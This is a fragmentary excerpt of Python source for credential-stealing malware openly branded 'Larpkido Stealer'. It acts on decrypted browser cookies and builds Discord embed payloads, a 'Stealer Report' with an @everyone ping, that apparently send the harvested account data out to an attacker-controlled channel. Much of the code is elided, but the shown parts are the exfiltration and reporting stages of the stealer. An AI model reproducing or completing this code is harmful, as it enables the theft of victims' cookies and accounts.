    ...
    if decrypted_cookie:
        ...
        if match:
            ...
            if info:
                ...
                gh = "https://discord.gg/larpkido"
                payload = {
                    "embeds": [{
                        "username": "Larpkido Stealer",
                        ...
                        "fields": fields,
                        "footer": {"text": f"Larpkido Multitool | {gh}"}
                    }]
                }
                try:
...
class NaviRecovery:
    def __init__(self):
        self.res = []
        self._log("Initializing Larpkido...")
    ...
    def rep_send(self):
        try:
            ...
            _main_emb = {"title": "<a:12705eyes:1505917648507109508> Larpkido Stealer Report", "url": gh, "color": 0x00A3FF, "thumbnail": {"url": "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"}, "fields": _fields, "footer": {"text": f"Larpkido Multitool | {gh}", "icon_url": "https://i.ibb.co/Wv94YGVx/larpkido.png"}, "timestamp": datetime.now(timezone.utc).isoformat()}
            _embeds = [_main_emb]
            ...
            _pj = {"content": "@everyone" if _SET["ping"] else "", "embeds": _embeds, "username": "Larpkido Stealer", "avatar_url": "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"}
